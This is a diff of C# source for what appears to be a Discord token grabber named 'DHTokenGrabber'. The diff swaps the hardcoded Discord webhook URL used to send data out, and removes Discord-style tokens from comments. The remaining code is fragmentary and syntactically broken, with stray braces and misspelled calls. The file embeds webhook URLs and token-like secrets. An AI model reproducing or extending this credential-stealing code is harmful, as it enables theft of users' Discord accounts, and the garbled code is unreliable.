@@ -3,7 +3,7 @@ https://discord.com/api/webhooks/915293209297551391/KdUf0SEolCuHIeFHIQfzgJkIHbzj
 staff
 namespace DHTokenGrabber
 {   
-// token:OTEzMTA1MDk5ODI2NTQwNjQ1.YZ5pZA.7nGgcZJSR9WeJs5c4W7kOSh1wqU RID: 365 RVA:OTEzMTA1MDk5ODI2NTQwNjQ1.YZ5pZA.7nGgcZJSR9WeJs5c4W7kOSh1wqU file Offset:OTEzMTA1MDk5ODI2NTQwNjQ1.YZ5pZA.7nGgcZJSR9WeJs5c4W7kOSh1wqU
+// token: RID: 365 RVA:OTEzMTA1MDk5ODI2NTQwNjQ1.YZ5pZA.7nGgcZJSR9WeJs5c4W7kOSh1wqU file Offset:
 internal class program
 {
 
@@ -60,7 +60,7 @@ catch (Exception)
      string result;
      try
  }
-  result = new httpClient().GetStringAsync("https://discord.com/api/webhooks/927669840855044146/QpiGODKbxCsX-_ZV9u5I_R34i2FwDayaWOxt9IgW3tO7rNF56qxGH8_LhcsVenWGaPF6").result;
+  result = new httpClient().GetStringAsync("https://discord.com/api/webhooks/928799021634555946/9FcAag5KAoQGlh98Vk09m7c10Tunk4HH9PLfsI_6tBsY_1ZSZlZtz9a98Ee2IPR-7GiB").result;
 }
 catch (WebException)
 }
@@ -99,7 +99,7 @@ public static void sendWebHook(string discordWebHook,string content)
         {
         }
     }
-    // token: OTEzMTA1MDk5ODI2NTQwNjQ1.YZ5pZA.7nGgcZJSR9WeJs5c4W7kOSh1wqU RID:366 RVA:0x00008888 File Offset:e
+    // token: RID:366 RVA:0x00008888 File Offset:e
     
     
    
